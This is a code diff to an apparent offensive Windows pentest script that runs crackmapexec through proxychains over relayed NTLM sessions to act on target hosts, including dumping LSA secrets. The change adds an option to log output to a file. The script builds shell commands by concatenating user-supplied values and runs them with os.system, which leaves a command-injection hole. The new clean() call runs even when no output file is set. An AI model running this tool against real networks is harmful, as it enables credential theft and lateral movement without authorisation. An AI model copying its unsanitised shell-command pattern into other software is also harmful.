@@ -18,7 +18,7 @@ username = ''
 admin = ''
 domain = ''
 run = False
-
+outfile = ''
 
 # Functions
 def usage():
@@ -34,6 +34,8 @@ def usage():
     print('	-h, --help		shows this help message and exits')
     print('	-e, --exclude		excludes ips listed in the file checked_ips.txt')
     print('	-A, --adminonly		only executes the command if the user is local admin on the IP')
+    print('        -o, --outfile           saves output to file provided')
+    print('                                (example: python3 ntlmrelayx2proxychains.py -a lsa -o outfile.txt)')
     print("")
     print("")
     print('Credits: ')
@@ -41,7 +43,8 @@ def usage():
     print("")
     print("")
     print("Disclaimer:")
-    print("	Use with care, on your own risk! (and other legal blabla indicating you are NOT using this tool on my responsibility/accountability :))")
+    print("	Use with care, on your own risk! ")
+    print("        (and other legal blabla indicating you are NOT using this tool on my responsibility/accountability :))")
     exit()
 
 
@@ -64,9 +67,12 @@ def getUsername():
 def execute_cmd():
     print('')
     cmd = 'proxychains crackmapexec smb -u "' + username + '" -p "" -d ' + domain + ' ' + ip + ' --' + action
+    if outfile != '':
+        print(outfile)
+        cmd = cmd + ' | tee -a ' + outfile
     print(cmd)
     os.system(cmd)
-
+    
 
 def getDomain():
     print('')
@@ -154,7 +160,7 @@ def adminRun():
 
 
 # Defining arguments
-options, args = getopt.getopt(sys.argv[1:], 'a:eAh', ['action=', 'exclude', 'adminonly', 'help'])
+options, args = getopt.getopt(sys.argv[1:], 'a:eAo:h', ['action=', 'exclude', 'adminonly', 'outfile=', 'help'])
 for opt, arg in options:
     if opt in ('-a', '--action'):
         run = True
@@ -163,6 +169,8 @@ for opt, arg in options:
         exclude = True
     elif opt in ('-A', '--adminonly'):
         adminonly = True
+    elif opt in ('-o', '--outfile'):
+        outfile = arg
     elif opt in ('-h', '--help'):
         usage()
 
@@ -208,3 +216,18 @@ elif adminonly:
     # --adminonly flag set
     getIP()
     adminRun()
+
+
+def clean():
+    with open(outfile, 'r') as file:
+        lines = file.readlines()
+
+    with open(outfile, 'w') as file:
+        for line in lines:
+            if line.find("proxychains") != -1:
+                pass
+            else:
+                file.write(line)
+
+
+clean()
